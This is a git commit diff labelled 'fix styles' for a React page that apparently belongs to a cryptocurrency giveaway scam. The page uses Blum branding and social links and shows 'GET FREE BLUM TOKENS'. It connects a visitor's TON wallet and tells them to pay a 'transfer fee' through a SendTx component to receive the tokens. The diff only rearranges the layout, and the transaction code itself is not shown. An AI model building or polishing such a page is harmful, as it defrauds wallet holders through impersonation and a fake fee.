4281f1d369191e70110b9f5c6fc052d34ea6acd5
Your Name <you@example.com>
2024-07-22 15:15:09 +0300

    fix styles

--- src/App.tsx
+++ src/App.tsx
@@ -9,35 +9,34 @@ import discordLogo from "./assets/discord.png";
 
 function App() {
   return (
-    <div className="main-container">
-      <div>
-        <div className="socials-container">
-          <a href="http://t.me/blumcrypto" target="_blank">
-            <img
-              src={telegramLogo}
-              className="logo-social"
-              alt="Telegram logo"
-            />
-          </a>
-          <a href="http://x.com/Blumcrypto" target="_blank">
-            <img src={twitterLogo} className="logo-social" alt="Twitter logo" />
-          </a>
-          <a href="https://discord.gg/blumcrypto" target="_blank">
-            <img src={discordLogo} className="logo-social" alt="Discord logo" />
-          </a>
-        </div>
-        <a href="https://react.dev" target="_blank">
-          <img src={blumLogo} className="logo" alt="React logo" />
+    <>
+      <div className="socials-container">
+        <a href="http://t.me/blumcrypto" target="_blank">
+          <img src={telegramLogo} className="logo-social" alt="Telegram logo" />
+        </a>
+        <a href="http://x.com/Blumcrypto" target="_blank">
+          <img src={twitterLogo} className="logo-social" alt="Twitter logo" />
+        </a>
+        <a href="https://discord.gg/blumcrypto" target="_blank">
+          <img src={discordLogo} className="logo-social" alt="Discord logo" />
         </a>
       </div>
-      <h1>GET FREE BLUM TOKENS</h1>
-      <TonConnectButton />
-      <AddressInfo />
-      <h2>
-        To receive BLUM tokens, you need to pay the transfer fee to your wallet.
-      </h2>
-      <SendTx />
-    </div>
+      <div className="main-container">
+        <div>
+          <a href="https://react.dev" target="_blank">
+            <img src={blumLogo} className="logo" alt="React logo" />
+          </a>
+        </div>
+        <h1>GET FREE BLUM TOKENS</h1>
+        <TonConnectButton />
+        <AddressInfo />
+        <h2>
+          To receive BLUM tokens, you need to pay the transfer fee to your
+          wallet.
+        </h2>
+        <SendTx />
+      </div>
+    </>
   );
 }
 
